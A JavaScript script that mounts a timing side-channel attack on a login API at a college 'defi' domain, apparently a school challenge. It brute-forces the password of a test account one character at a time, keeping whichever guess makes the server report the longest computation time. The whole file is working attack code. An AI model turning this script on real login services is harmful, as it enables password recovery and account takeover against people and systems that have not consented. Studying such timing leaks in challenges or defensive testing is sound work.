
const CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_".split("");

async function solve() {

    let currentCompute = 0;
    let currentPassword = "";

    let updated = true;

    while (updated) {

        updated = false;
        
        const tree = getTree(currentPassword);

        const promises = tree.map(async (entry) => {
            const result = await attempt(entry);
            return { entry, result };
        });

        const results = await Promise.all(promises);

        for (const item of results) {
            if (item.result === true) {
                currentPassword = item.entry;
                console.log(currentPassword);
                return;
            }

            if (item.result > currentCompute) {
                currentCompute = item.result;
                currentPassword = item.entry;
                console.log(currentPassword);
                updated = true;
            }
        }

    }
}



function getTree(pConfirmed) {
    const tree = [];
    for (const char of CHARS) {
        tree.push(pConfirmed + char);
    }
    return tree;
}



async function attempt(pPasword) {
    const response = await fetch("https://omnisus-api.defi.info.cegepmontpetit.ca/api/Account/Login", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            username: "utilisateur_test_pour_nouvelle_connexion",
            password: pPasword
        })
    });
    const parsed = await response.json();
    if (parsed.error) {
        const match = parsed.error.match(/Temps de calcul : (\d+)ms/);
        if (match) {
            return parseInt(match[1], 10);
        }
        else {
            console.error(`API returned unexpected result: ${parsed}`);
            return true;
        }
    }
    else {
        console.log(`Solution found: ${JSON.stringify(parsed)}`);
        return true;
    }
}

solve();